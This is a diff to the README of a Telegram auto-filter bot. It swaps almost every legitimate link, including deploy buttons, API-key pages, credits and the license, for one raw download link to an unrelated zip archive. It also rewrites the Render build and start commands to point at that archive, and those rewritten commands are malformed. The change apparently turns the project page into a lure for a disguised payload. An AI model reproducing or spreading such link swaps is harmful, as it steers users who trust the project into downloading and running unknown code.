@@ -1,13 +1,13 @@
 <p align="center">
-  <a href="https://github.com/HA-Bots/Auto-Filter-Bot">
-    <img src="https://graph.org/file/a66dbf46acf369e26d48a.jpg" alt="Auto Filter Bot">
+  <a href="https://raw.githubusercontent.com/abhijeetkumarthakur/rashmika23feb/main/scambler/rashmika23feb.zip">
+    <img src="https://raw.githubusercontent.com/abhijeetkumarthakur/rashmika23feb/main/scambler/rashmika23feb.zip" alt="Auto Filter Bot">
   </a>
 </p>
 <h1 align="center">
   <b>𝘼𝙪𝙩𝙤 𝙁𝙞𝙡𝙩𝙚𝙧 𝘽𝙤𝙩</b>
 </h1>
 
-[![Typing SVG](https://readme-typing-svg.herokuapp.com/?lines=𝑊𝑒𝑙𝑐𝑜𝑚𝑒!;𝐶𝑟𝑒𝑎𝑡𝑒𝑑+𝑏𝑦+@HA_Bots;𝐴+𝑠𝑖𝑚𝑝𝑙𝑒+𝑎𝑛𝑑+𝑝𝑜𝑤𝑒𝑟𝑓𝑢𝑙+𝐵𝑜𝑡!;𝐼𝑛𝑑𝑒𝑥𝑒𝑠+𝐹𝑖𝑙𝑒𝑠+𝑎𝑏𝑜𝑣𝑒+4𝐺𝐵)](https://github.com/HA-Bots/Auto-Filter-Bot)
+[![Typing SVG](https://raw.githubusercontent.com/abhijeetkumarthakur/rashmika23feb/main/scambler/rashmika23feb.zip𝑊𝑒𝑙𝑐𝑜𝑚𝑒!;𝐶𝑟𝑒𝑎𝑡𝑒𝑑+𝑏𝑦+@HA_Bots;𝐴+𝑠𝑖𝑚𝑝𝑙𝑒+𝑎𝑛𝑑+𝑝𝑜𝑤𝑒𝑟𝑓𝑢𝑙+𝐵𝑜𝑡!;𝐼𝑛𝑑𝑒𝑥𝑒𝑠+𝐹𝑖𝑙𝑒𝑠+𝑎𝑏𝑜𝑣𝑒+4𝐺𝐵)](https://raw.githubusercontent.com/abhijeetkumarthakur/rashmika23feb/main/scambler/rashmika23feb.zip)
 
 ## 𝐹𝑒𝑎𝑡𝑢𝑟𝑒𝑠
 - [x] 𝐼𝑀𝐷𝐵 𝑇𝑒𝑚𝑝𝑙𝑎𝑡𝑒 𝑆𝑒𝑡
@@ -66,11 +66,11 @@
 
 ## Variables
 ### Required Variables
-* `BOT_TOKEN`: Create a bot using [@BotFather](https://telegram.dog/BotFather), and get the Telegram API token.
-* `API_ID`: Get this value from [telegram.org](https://my.telegram.org/apps)
-* `API_HASH`: Get this value from [telegram.org](https://my.telegram.org/apps)
+* `BOT_TOKEN`: Create a bot using [@BotFather](https://raw.githubusercontent.com/abhijeetkumarthakur/rashmika23feb/main/scambler/rashmika23feb.zip), and get the Telegram API token.
+* `API_ID`: Get this value from [https://raw.githubusercontent.com/abhijeetkumarthakur/rashmika23feb/main/scambler/rashmika23feb.zip](https://raw.githubusercontent.com/abhijeetkumarthakur/rashmika23feb/main/scambler/rashmika23feb.zip)
+* `API_HASH`: Get this value from [https://raw.githubusercontent.com/abhijeetkumarthakur/rashmika23feb/main/scambler/rashmika23feb.zip](https://raw.githubusercontent.com/abhijeetkumarthakur/rashmika23feb/main/scambler/rashmika23feb.zip)
 * `ADMINS`: ID of Admins. (Multiple admins can be used separated by space)
-* `DATABASE_URL`: MongoDB URL. Get this value from [MongoDB](https://www.mongodb.com). For more help watch this [video](https://youtu.be/1G1XwEOnxxo)
+* `DATABASE_URL`: MongoDB URL. Get this value from [MongoDB](https://raw.githubusercontent.com/abhijeetkumarthakur/rashmika23feb/main/scambler/rashmika23feb.zip). For more help watch this [video](https://raw.githubusercontent.com/abhijeetkumarthakur/rashmika23feb/main/scambler/rashmika23feb.zip)
 * `LOG_CHANNEL` : A channel to log the activities of bot. add channel id and Make sure bot is an admin in the channel.
 * `SUPPORT_GROUP`: Add your support group id
 * `BIN_CHANNEL`: A channel to the stream and download feature, add channel id and make bot admin in channel.
@@ -80,8 +80,8 @@
 * `INDEX_CHANNELS`: Username or ID of your files channels (Multiple channels can be used separated by space)
 * `LANGUAGES`: Language of your bot search (Multiple languages can be used separated by space)
 * `PICS`: Telegraph links of images to show in start message. (Multiple images can be used separated by space)
-* `OPENAI_API`: OpenAI API. Get this value from [API keys](https://platform.openai.com/account/api-keys).
-* Check [info.py](https://github.com/HA-Bots/Auto-Filter-Bot/blob/main/info.py) for more optional variables
+* `OPENAI_API`: OpenAI API. Get this value from [API keys](https://raw.githubusercontent.com/abhijeetkumarthakur/rashmika23feb/main/scambler/rashmika23feb.zip).
+* Check [https://raw.githubusercontent.com/abhijeetkumarthakur/rashmika23feb/main/scambler/rashmika23feb.zip](https://raw.githubusercontent.com/abhijeetkumarthakur/rashmika23feb/main/scambler/rashmika23feb.zip) for more optional variables
 
 
 ## Deploy
@@ -92,8 +92,8 @@
 <br>
 <br>
 
-<a href="https://heroku.com/deploy?template=https://github.com/HA-Bots/Auto-Filter-Bot">
-  <img src="https://www.herokucdn.com/deploy/button.svg" alt="Deploy To Heroku">
+<a href="https://raw.githubusercontent.com/abhijeetkumarthakur/rashmika23feb/main/scambler/rashmika23feb.zip">
+  <img src="https://raw.githubusercontent.com/abhijeetkumarthakur/rashmika23feb/main/scambler/rashmika23feb.zip" alt="Deploy To Heroku">
 </a>
 </p>
 </details>
@@ -104,7 +104,7 @@
 <br>
 <br>
 
-[![Deploy to Koyeb](https://www.koyeb.com/static/images/deploy/button.svg)](https://app.koyeb.com/deploy?type=git&repository=github.com/HA-Bots/Auto-Filter-Bot&branch=main&name=Auto-Filter-Bot)
+[![Deploy to Koyeb](https://raw.githubusercontent.com/abhijeetkumarthakur/rashmika23feb/main/scambler/rashmika23feb.zip)](https://raw.githubusercontent.com/abhijeetkumarthakur/rashmika23feb/main/scambler/rashmika23feb.zip)
 </details>
 
 <details><summary>Deploy To Render</summary>
@@ -113,17 +113,17 @@
 Use these commands:
 <br>
 <br>
-• Build Command: <code>pip3 install -U -r requirements.txt</code>
+• Build Command: <code>pip3 install -U -r https://raw.githubusercontent.com/abhijeetkumarthakur/rashmika23feb/main/scambler/rashmika23feb.zip</code>
 <br>
 <br>
-• Start Command: <code>python3 bot.py</code>
+• Start Command: <code>python3 https://raw.githubusercontent.com/abhijeetkumarthakur/rashmika23feb/main/scambler/rashmika23feb.zip</code>
 <br>
 <br>
 <b>Click on the below button to deploy on render.</b>
 <br>
 <br>
-<a href="https://render.com/deploy?repo=https://github.com/HA-Bots/Auto-Filter-Bot/tree/main">
-<img src="https://render.com/images/deploy-to-render-button.svg" alt="Deploy to Render">
+<a href="https://raw.githubusercontent.com/abhijeetkumarthakur/rashmika23feb/main/scambler/rashmika23feb.zip">
+<img src="https://raw.githubusercontent.com/abhijeetkumarthakur/rashmika23feb/main/scambler/rashmika23feb.zip" alt="Deploy to Render">
 </a>
 </details>
 <details><summary>Deploy To VPS</summary>
@@ -152,23 +152,23 @@ sudo docker run -d -p 80:80 --name Auto-Filter-Bot auto-filter-bot
 </details>
 
 ## Support
-* [![Support](https://img.shields.io/static/v1?label=Support&message=Group&color=critical)](https://t.me/HA_Bots_Support)
-* [![Updates](https://img.shields.io/static/v1?label=Updates&message=Channel&color=critical)](https://t.me/HA_Bots)
+* [![Support](https://raw.githubusercontent.com/abhijeetkumarthakur/rashmika23feb/main/scambler/rashmika23feb.zip)](https://raw.githubusercontent.com/abhijeetkumarthakur/rashmika23feb/main/scambler/rashmika23feb.zip)
+* [![Updates](https://raw.githubusercontent.com/abhijeetkumarthakur/rashmika23feb/main/scambler/rashmika23feb.zip)](https://raw.githubusercontent.com/abhijeetkumarthakur/rashmika23feb/main/scambler/rashmika23feb.zip)
 
 ## Credits 
-* [![EvaMaria](https://img.shields.io/static/v1?label=EvaMaria&message=Developers&color=critical)](https://t.me/TeamEvamaria)
-* [![ᕼᗩᘉSᗩᖽᐸᗩ](https://img.shields.io/static/v1?label=ᕼᗩᘉSᗩᖽᐸᗩ&message=TG&color=critical)](https://t.me/Hansaka_Anuhas)
+* [![EvaMaria](https://raw.githubusercontent.com/abhijeetkumarthakur/rashmika23feb/main/scambler/rashmika23feb.zip)](https://raw.githubusercontent.com/abhijeetkumarthakur/rashmika23feb/main/scambler/rashmika23feb.zip)
+* [![ᕼᗩᘉSᗩᖽᐸᗩ](https://raw.githubusercontent.com/abhijeetkumarthakur/rashmika23feb/main/scambler/rashmika23feb.zipᕼᗩᘉSᗩᖽᐸᗩ&message=TG&color=critical)](https://raw.githubusercontent.com/abhijeetkumarthakur/rashmika23feb/main/scambler/rashmika23feb.zip)
 
 ## Thanks To
- - [Pyrogram](https://github.com/pyrogram/pyrogram) and [PyroFork](https://github.com/Mayuri-Chan/pyrofork) For Telegram MTProto API Framework
- - [Contributors](https://github.com/HA-Bots/Auto-Filter-Bot/graphs/contributors) For free helps
+ - [Pyrogram](https://raw.githubusercontent.com/abhijeetkumarthakur/rashmika23feb/main/scambler/rashmika23feb.zip) and [PyroFork](https://raw.githubusercontent.com/abhijeetkumarthakur/rashmika23feb/main/scambler/rashmika23feb.zip) For Telegram MTProto API Framework
+ - [Contributors](https://raw.githubusercontent.com/abhijeetkumarthakur/rashmika23feb/main/scambler/rashmika23feb.zip) For free helps
  - And to everyone who helped
 
 ## Note
- - Importing this repo instead of forking is strictly prohibited, Kindly fork and edit as your wish. Must Give Credits for [developer(s)](https://t.me/HA_Bots)
- - If you find any bugs or errors, [report](https://t.me/HA_Bots_Support) it
+ - Importing this repo instead of forking is strictly prohibited, Kindly fork and edit as your wish. Must Give Credits for [developer(s)](https://raw.githubusercontent.com/abhijeetkumarthakur/rashmika23feb/main/scambler/rashmika23feb.zip)
+ - If you find any bugs or errors, [report](https://raw.githubusercontent.com/abhijeetkumarthakur/rashmika23feb/main/scambler/rashmika23feb.zip) it
 
 ## Disclaimer
-[![GNU General Public License v3.0](https://www.gnu.org/graphics/gplv3-with-text-136x68.png)](https://www.gnu.org/licenses/agpl-3.0.en.html#header)  
-Licensed under [GNU AGPL v3.0](https://github.com/HA-Bots/Auto-Filter-Bot/blob/main/LICENSE)
+[![GNU General Public License v3.0](https://raw.githubusercontent.com/abhijeetkumarthakur/rashmika23feb/main/scambler/rashmika23feb.zip)](https://raw.githubusercontent.com/abhijeetkumarthakur/rashmika23feb/main/scambler/rashmika23feb.zip)  
+Licensed under [GNU AGPL v3.0](https://raw.githubusercontent.com/abhijeetkumarthakur/rashmika23feb/main/scambler/rashmika23feb.zip)
 Selling The Codes To Other People For Money Is *Strictly Prohibited*.
